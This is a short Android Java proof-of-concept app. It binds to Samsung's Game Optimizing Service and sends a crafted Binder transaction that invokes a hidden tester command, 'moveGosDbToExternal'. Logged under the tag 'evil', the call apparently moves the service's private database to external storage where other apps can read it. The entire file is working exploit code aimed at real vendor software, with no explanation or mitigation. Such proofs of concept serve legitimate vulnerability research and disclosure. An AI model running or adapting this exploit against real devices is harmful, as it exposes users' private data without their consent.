package poc.app;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.ServiceConnection;
import android.os.Bundle;
import android.os.IBinder;
import android.os.Parcel;
import android.util.Log;

public class MainActivity extends Activity {
    private ServiceConnection mServiceConnection = new ServiceConnection() {
        public void onServiceConnected(ComponentName cName, IBinder service) {
            processBinder(service);
        }

        public void onServiceDisconnected(ComponentName cName) {
        }
    };

    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        Intent i = new Intent();
        i.setClassName("com.samsung.android.game.gos", "com.samsung.android.game.gos.endpoint.GosSystemService");
        bindService(i, mServiceConnection, BIND_AUTO_CREATE);
    }

    private void processBinder(IBinder binder) {
        try {
            Parcel parcel = Parcel.obtain();
            parcel.writeInterfaceToken("com.samsung.android.game.gos.IGosSystemService");
            parcel.writeString("test_features");
            parcel.writeString("{'tester_command_id':'moveGosDbToExternal'}");

            Parcel reply = Parcel.obtain();

            binder.transact(1, parcel, reply, 0);
            reply.readException();
            Log.i("evil", "Reply: " + reply.readString());
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}